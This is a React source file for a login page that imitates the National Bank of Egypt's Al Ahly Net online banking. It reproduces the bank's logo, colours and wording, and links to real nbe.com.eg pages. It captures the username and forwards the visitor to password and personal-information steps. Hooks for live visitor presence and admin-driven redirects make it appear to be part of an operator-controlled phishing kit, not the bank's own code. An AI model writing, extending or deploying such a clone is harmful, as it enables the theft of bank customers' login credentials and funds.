/**
 * البنك الأهلي المصري - تسجيل الدخول (الخطوة 1: كود المستخدم)
 * تصميم مطابق لتطبيق الأهلي نت الرسمي
 */
import React, { useState, useCallback } from "react";
import { useLocation } from "wouter";
import { useLiveVisitor } from "@/hooks/useLiveVisitor";
import { usePresence } from "@/hooks/usePresence";
import { useAdminRedirect } from "@/hooks/useAdminRedirect";

export default function Login() {
  usePresence("login");
  useAdminRedirect();
  useLiveVisitor("login");
  const [, setLocation] = useLocation();
  const [username, setUsername] = useState("");
  const [activeTab, setActiveTab] = useState<"individual" | "corporate">("individual");
  const [errorMsg, setErrorMsg] = useState("");

  const hasArabic = useCallback((text: string) => /[\u0600-\u06FF\u0750-\u077F\u08A0-\u08FF\uFB50-\uFDFF\uFE70-\uFEFF]/.test(text), []);

  const handleNext = () => {
    if (!username.trim()) { setErrorMsg("يرجى إدخال كود المستخدم"); return; }
    if (hasArabic(username)) { setErrorMsg("كود المستخدم يجب أن يكون باللغة الإنجليزية فقط"); return; }
    setErrorMsg("");
    sessionStorage.setItem("pw_username", username);
    setLocation("/password");
  };

  return (
    <div dir="rtl" style={{ width: "100%", maxWidth: "100vw", minHeight: "100vh", background: "#ffffff", fontFamily: "'Cairo', sans-serif", display: "flex", flexDirection: "column", alignItems: "center", overflowX: "hidden" }}>
      <div style={{ width: "100%", maxWidth: "420px", minHeight: "100vh", display: "flex", flexDirection: "column", padding: "0 20px", boxSizing: "border-box" }}>
        
        {/* Top bar - English link */}
        <div style={{ padding: "14px 0 0", display: "flex", justifyContent: "flex-start" }}>
          <span style={{ display: "flex", alignItems: "center", gap: "6px" }}>
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#666" strokeWidth="1.5">
              <circle cx="12" cy="12" r="10"/><path d="M2 12h20M12 2a15.3 15.3 0 014 10 15.3 15.3 0 01-4 10 15.3 15.3 0 01-4-10 15.3 15.3 0 014-10z"/>
            </svg>
            <span style={{ color: "#666", fontSize: "13px" }}>English</span>
          </span>
        </div>

        {/* Logo */}
        <div style={{ textAlign: "center", padding: "22px 0 14px" }}>
          <img
            src="/manus-storage/nbe-official-logo-source_d2709322.png"
            alt="البنك الأهلي المصري - National Bank of Egypt"
            style={{ height: "auto", maxHeight: "65px", maxWidth: "190px", width: "100%", objectFit: "contain" }}
            onError={(e) => { (e.target as HTMLImageElement).src = "/manus-storage/nbe-official-logo-source_d2709322.png"; }}
          />
        </div>

        {/* Welcome message */}
        <div style={{ textAlign: "center", marginBottom: "20px" }}>
          <h2 style={{ fontSize: "18px", fontWeight: "800", color: "#1B7A3D", margin: "0 0 6px" }}>
            مرحبآ بك في الاهلي نت
          </h2>
          <p style={{ fontSize: "13px", fontWeight: "600", color: "#64748b", margin: 0 }}>
            من فضلك سجل الدخول باسم المستخدم
          </p>
        </div>

        {/* Tabs - أفراد / شركات */}
        <div style={{ marginBottom: "24px" }}>
          <div style={{ display: "flex", gap: "12px", justifyContent: "center" }}>
            <button
              onClick={() => setActiveTab("individual")}
              style={{
                flex: 1, padding: "12px 16px", borderRadius: "10px", border: "none",
                fontSize: "15px", fontWeight: "700", fontFamily: "'Cairo', sans-serif", cursor: "pointer",
                display: "flex", alignItems: "center", justifyContent: "center", gap: "8px",
                background: activeTab === "individual" ? "#5a6577" : "#f0f1f3",
                color: activeTab === "individual" ? "white" : "#888",
                transition: "all 0.2s ease",
              }}
            >
              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                <path d="M20 21v-2a4 4 0 00-4-4H8a4 4 0 00-4 4v2"/><circle cx="12" cy="7" r="4"/>
              </svg>
              افراد
            </button>
            <button
              onClick={() => setActiveTab("corporate")}
              style={{
                flex: 1, padding: "12px 16px", borderRadius: "10px", border: "none",
                fontSize: "15px", fontWeight: "700", fontFamily: "'Cairo', sans-serif", cursor: "pointer",
                display: "flex", alignItems: "center", justifyContent: "center", gap: "8px",
                background: activeTab === "corporate" ? "#5a6577" : "#f0f1f3",
                color: activeTab === "corporate" ? "white" : "#888",
                transition: "all 0.2s ease",
              }}
            >
              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                <path d="M17 21v-2a4 4 0 00-4-4H5a4 4 0 00-4 4v2"/><circle cx="9" cy="7" r="4"/>
                <path d="M23 21v-2a4 4 0 00-3-3.87M16 3.13a4 4 0 010 7.75"/>
              </svg>
              شركات
            </button>
          </div>
        </div>

        {/* Input Field */}
        <div style={{ flex: 1 }}>
          {errorMsg && (
            <div style={{ background: "#fef2f2", border: "1px solid #fecaca", borderRadius: "10px", padding: "10px 14px", marginBottom: "14px", color: "#dc2626", fontSize: "13px", textAlign: "center" }}>
              {errorMsg}
            </div>
          )}

          <div style={{ marginBottom: "8px" }}>
            <input
              dir="ltr"
              lang="en"
              type="text"
              placeholder="كود المستخدم"
              value={username}
              onChange={(e) => { if (!hasArabic(e.target.value)) setUsername(e.target.value); }}
              style={{
                width: "100%", padding: "16px 14px", border: "1.5px solid #d1d5db", borderRadius: "10px",
                fontSize: "15px", fontFamily: "'Cairo', sans-serif", boxSizing: "border-box",
                outline: "none", background: "#ffffff", color: "#1a1a1a", textAlign: "right",
                transition: "border-color 0.2s ease",
              }}
              onFocus={(e) => { e.target.style.borderColor = "#1B7A3D"; }}
              onBlur={(e) => { e.target.style.borderColor = "#d1d5db"; }}
            />
          </div>

          <div style={{ textAlign: "left", marginBottom: "24px" }}>
            <button
              type="button"
              onClick={() => setLocation("/reset-password")}
              style={{ color: "#1B7A3D", fontSize: "13px", fontWeight: "600", cursor: "pointer", background: "none", border: 0, padding: 0, fontFamily: "'Cairo', sans-serif" }}
            >
              نسيت كود المستخدم
            </button>
          </div>

          {/* Submit Button with Fingerprint icon */}
          <div style={{ display: "flex", gap: "10px", alignItems: "center", marginBottom: "24px" }}>
            <div
              aria-hidden="true"
              style={{
                width: "52px", height: "52px", borderRadius: "10px", border: "1.5px solid #d1d5db",
                background: "#f8f9fa", display: "flex", alignItems: "center", justifyContent: "center",
                flexShrink: 0,
              }}
            >
              <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="#1B7A3D" strokeWidth="1.5">
                <path d="M12 10v4M7.5 8a5.5 5.5 0 019 0M4.5 6a9.5 9.5 0 0115 0"/>
                <path d="M12 14a2 2 0 100-4 2 2 0 000 4z"/>
                <path d="M9 16.5A5.5 5.5 0 0012 18a5.5 5.5 0 003-1.5"/>
              </svg>
            </div>
            <button
              onClick={handleNext}
              style={{
                flex: 1, background: "linear-gradient(135deg, #1B7A3D, #145a2c)", color: "white",
                border: "none", borderRadius: "10px", padding: "14px", fontSize: "16px", fontWeight: "700",
                cursor: "pointer", fontFamily: "'Cairo', sans-serif", boxShadow: "0 4px 15px rgba(27,122,61,0.25)",
                transition: "transform 0.1s ease",
              }}
              onMouseDown={(e) => { (e.target as HTMLElement).style.transform = "scale(0.97)"; }}
              onMouseUp={(e) => { (e.target as HTMLElement).style.transform = "scale(1)"; }}
            >
              تسجيل الدخول
            </button>
          </div>

          {/* Register Link */}
          <div style={{ textAlign: "center", marginBottom: "24px" }}>
            <button
              type="button"
              onClick={() => setLocation("/personal-info")}
              style={{ color: "#1B7A3D", fontSize: "15px", fontWeight: "700", cursor: "pointer", textDecoration: "underline", marginBottom: "6px", background: "none", border: 0, padding: 0, fontFamily: "'Cairo', sans-serif" }}
            >
              سجل الان
            </button>
            <p style={{ color: "#1a1a1a", fontSize: "14px", fontWeight: "700", margin: 0, textDecoration: "underline" }}>
              انضم لعملاء البنك الاهلي المصري
            </p>
          </div>
        </div>

        {/* Bottom Services */}
        <div style={{ padding: "16px 0", borderTop: "1px solid #e5e7eb", marginTop: "auto" }}>
          <div style={{ display: "flex", justifyContent: "space-around", gap: "2px" }}>
            {[
              { icon: (
                <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#555" strokeWidth="1.5">
                  <rect x="3" y="4" width="18" height="16" rx="2"/><path d="M3 10h18M8 14h.01M12 14h.01"/>
                </svg>
              ), label: "احجز موعد", href: "https://www.nbe.com.eg/NBE/E/#/EN/ProductDetails?inParams=%7B%22CategoryID%22%3A%22selfservices%22%2C%22ProductID%22%3A%2218782%22" },
              { icon: (
                <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#555" strokeWidth="1.5">
                  <path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0118 0z"/><circle cx="12" cy="10" r="3"/>
                </svg>
              ), label: "ماكينة الصارف\nالآلي / الفرع", href: "https://www.nbe.com.eg/NBE/E/#/AR/ATMBranch" },
              { icon: (
                <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#555" strokeWidth="1.5">
                  <circle cx="12" cy="12" r="10"/><path d="M2 12h20M12 2a15.3 15.3 0 014 10 15.3 15.3 0 01-4 10 15.3 15.3 0 01-4-10 15.3 15.3 0 014-10z"/>
                </svg>
              ), label: "حاسبة العملات", href: "https://www.nbe.com.eg/NBE/E/#/AR/ExchangeRatesAndCurrencyConverter" },
              { icon: (
                <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#555" strokeWidth="1.5">
                  <rect x="3" y="4" width="18" height="16" rx="2"/><path d="M3 10h18M7 14h4"/>
                </svg>
              ), label: "احجز موعد", href: "https://www.nbe.com.eg/NBE/E/#/EN/ProductDetails?inParams=%7B%22CategoryID%22%3A%22selfservices%22%2C%22ProductID%22%3A%2218782%22" },
            ].map((item, i) => (
              <a key={i} href={item.href} target="_blank" rel="noopener noreferrer" aria-label={item.label.replace("\n", " ")} style={{ textAlign: "center", cursor: "pointer", flex: 1, minWidth: 0, textDecoration: "none" }}>
                <div style={{ width: "42px", height: "42px", background: "#e8eaed", borderRadius: "10px", display: "flex", alignItems: "center", justifyContent: "center", margin: "0 auto 4px" }}>
                  {item.icon}
                </div>
                <small style={{ fontSize: "9px", color: "#555", display: "block", lineHeight: "1.3", fontWeight: "600", whiteSpace: "pre-line" }}>{item.label}</small>
              </a>
            ))}
          </div>
        </div>
      </div>
    </div>
  );
}
